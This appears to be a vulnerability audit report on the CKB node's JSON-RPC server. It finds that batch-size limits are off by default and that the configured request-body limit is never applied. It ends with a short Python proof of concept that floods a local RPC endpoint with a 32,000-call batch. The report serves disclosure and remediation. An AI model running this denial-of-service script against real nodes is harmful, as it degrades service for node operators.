Audit Report

## Title
Unbounded JSON-RPC Batch Processing with No Default Limit Enables Local RPC DoS — (`rpc/src/server.rs`)

## Summary
The CKB JSON-RPC server initialises `JSONRPC_BATCH_LIMIT` only when `config.rpc_batch_limit` is `Some`, but the default configuration leaves `rpc_batch_limit` commented out, so no batch size guard is active by default. A caller with RPC access can send a single HTTP POST containing a JSON array of thousands of method calls, forcing the server to process all of them sequentially with no rejection. Separately, `max_request_body_size` is read from config but never applied to the axum router; axum's hardcoded 2 MiB default applies instead, silently overriding the operator-configured value.

## Finding Description

**Root cause 1 — batch limit is opt-in and off by default**

`RpcServer::new` initialises `JSONRPC_BATCH_LIMIT` only inside an `if let Some(...)` branch:

```rust
// rpc/src/server.rs L53-55
if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
    let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
}
```

The batch handler at lines 275–282 checks `JSONRPC_BATCH_LIMIT.get()`, which returns `None` when the field was never set, so the guard is never entered:

```rust
if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
    && calls.len() > *batch_size
{ ... }
```

The default config explicitly leaves the field commented out (`# rpc_batch_limit = 2000`), and the comment acknowledges the risk: *"a huge batch request may cost a lot of memory or makes the RPC server slow."* The test harness works around this by hardcoding `rpc_batch_limit: Some(1000)`, confirming the production default is unprotected.

**Root cause 2 — `max_request_body_size` is never wired into the router**

`start_server` receives only `address`, `handler`, and `enable_websocket`; `config.max_request_body_size` is never passed in and no `axum::extract::DefaultBodyLimit` or `tower_http::limit::RequestBodyLimitLayer` is added to the router:

```rust
// rpc/src/server.rs L119-129
let app = Router::new()
    .route("/", method_router.clone())
    ...
    .layer(CorsLayer::permissive())
    .layer(TimeoutLayer::with_status_code(...))
    .layer(Extension(stream_config));
    // ← no body-limit layer
```

Axum's built-in 2 MiB default therefore applies unconditionally. The operator-configured `max_request_body_size = 10485760` (10 MiB) is silently ignored. Note that this makes the effective limit *more* restrictive than the documented default, not less — it does not expand the attack surface beyond 2 MiB, but it does mean operators cannot rely on the configured value.

**Exploit flow**

Within the 2 MiB axum default, a caller can pack approximately 32,000 minimal `get_tip_block_number` calls (each ~65 bytes). With no batch limit active, `stream::iter(calls).then(...)` processes every call sequentially on the shared async runtime. Heavier calls (e.g. `dry_run_transaction`) amplify per-call CPU cost within the same envelope.

## Impact Explanation

The confirmed impact is local RPC degradation: the RPC endpoint becomes unresponsive while processing the oversized batch. This fits **Note (0–500 points) — Any local RPC API crash**. The claim that P2P sync and chain processing stall due to async-runtime saturation is plausible if the runtime is shared, but is not concretely proven by the submitted evidence; the submitted PoC uses lightweight calls that complete quickly. The higher "High: crash a CKB node" severity is not supported by the provided proof.

## Likelihood Explanation

The RPC binds to `127.0.0.1` by default, so the baseline attacker is a local process or a user with shell access — explicitly in scope as a "supported local CLI/RPC user." No authentication is required. The exploit requires a single HTTP POST and no special knowledge. The batch limit being disabled by default means every default-configured node is affected.

## Recommendation

1. **Enable batch limit by default**: Set a non-`None` default for `rpc_batch_limit` in `RpcConfig` (e.g. 200) so `JSONRPC_BATCH_LIMIT` is always initialised.
2. **Apply the configured body limit**: In `start_server`, accept `max_request_body_size` as a parameter and add `.layer(axum::extract::DefaultBodyLimit::max(max_request_body_size))` to the router so the operator-configured value is actually enforced.
3. **Consider unconditional initialisation**: Replace the `OnceLock<usize>` pattern with a plain `AtomicUsize` initialised to a safe default, eliminating the opt-in footgun.

## Proof of Concept

```python
import json, requests

# ~32,000 calls fit within axum's 2 MiB default body limit
batch = [{"jsonrpc":"2.0","method":"get_tip_block_number","params":[],"id":i}
         for i in range(32_000)]

r = requests.post("http://127.0.0.1:8114/", json=batch, timeout=300)
# With default config (rpc_batch_limit commented out), all 32,000 calls
# are processed sequentially; RPC is unresponsive during processing.
print(len(r.json()), "responses received")
```

Verify the missing batch limit by inspecting `JSONRPC_BATCH_LIMIT.get()` returning `None` on a node started with the default `ckb.toml` (where `rpc_batch_limit` is commented out). Verify the missing body-limit layer by grepping the router construction in `rpc/src/server.rs` for any `DefaultBodyLimit` or `RequestBodyLimitLayer` — none exists.